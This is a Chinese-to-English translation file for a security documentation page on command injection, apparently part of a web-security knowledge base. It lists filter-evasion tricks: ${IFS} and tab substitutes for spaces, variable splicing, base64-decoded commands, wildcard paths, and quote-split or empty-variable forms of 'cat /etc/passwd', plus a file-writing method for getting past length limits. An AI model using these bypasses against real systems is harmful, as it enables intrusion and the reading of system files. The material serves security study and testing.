#: ../../source/vuln/cmdinjection.rst:52
msgid "常见绕过方式"
msgstr "Common Bypass Methods"

#: ../../source/vuln/cmdinjection.rst:55
msgid "空格绕过"
msgstr "Space Bypass"

#: ../../source/vuln/cmdinjection.rst:56
msgid "``<`` 符号 ``cat<123``"
msgstr "``<`` operator, such as ``cat<123``"

#: ../../source/vuln/cmdinjection.rst:57
msgid "``\\t`` / ``%09``"
msgstr "``\\t`` / ``%09``"

#: ../../source/vuln/cmdinjection.rst:58
#, python-brace-format
msgid ""
"``${IFS}`` "
"其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串"
msgstr ""
"``${IFS}``; the braces are used for truncation. For example, ``cat$IFS2`` is"
" treated as the variable name ``IFS2``. Adding ``$`` afterward can also "
"truncate the expression; ``$9`` is commonly used because it refers to the "
"ninth argument of the current shell process and is always an empty string."

#: ../../source/vuln/cmdinjection.rst:61
msgid "黑名单绕过"
msgstr "Blacklist Bypass"

#: ../../source/vuln/cmdinjection.rst:62
msgid "``a=l;b=s;$a$b``"
msgstr "``a=l;b=s;$a$b``"

#: ../../source/vuln/cmdinjection.rst:63
msgid "base64 ``echo \"bHM=\" | base64 -d``"
msgstr "base64 ``echo \"bHM=\" | base64 -d``"

#: ../../source/vuln/cmdinjection.rst:64
msgid "``/?in/?s`` => ``/bin/ls``"
msgstr "``/?in/?s`` => ``/bin/ls``"

#: ../../source/vuln/cmdinjection.rst:65
msgid "连接符 ``cat /etc/pass'w'd``"
msgstr "String concatenation ``cat /etc/pass'w'd``"

#: ../../source/vuln/cmdinjection.rst:66
msgid "未定义的初始化变量 ``cat$x /etc/passwd``"
msgstr "Undefined initialized variable ``cat$x /etc/passwd``"

#: ../../source/vuln/cmdinjection.rst:69
msgid "长度限制绕过"
msgstr "Length Limit Bypass"

#: ../../source/vuln/cmdinjection.rst:78
msgid ""
"上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 "
"直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看) "
"如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , "
"是不存在标准输入流的，所以可以直接创建文件"
msgstr ""
"The method above writes commands through command-line redirection, then uses"
" ``ls`` sorted by time to write the commands into a file, and finally "
"executes it. When running directly in a Linux terminal, creating the file "
"requires adding a command before the redirection operator. Short commands "
"such as ``w`` or ``[`` can be used here; use ``ls /usr/bin/?`` to list "
"candidates. Without such a command, ``Ctrl+D`` is required to end input, "
"which is equivalent to redirecting standard input. In PHP, when functions "
"such as ``shell_exec`` execute system commands, there is no standard input "
"stream, so the file can be created directly."

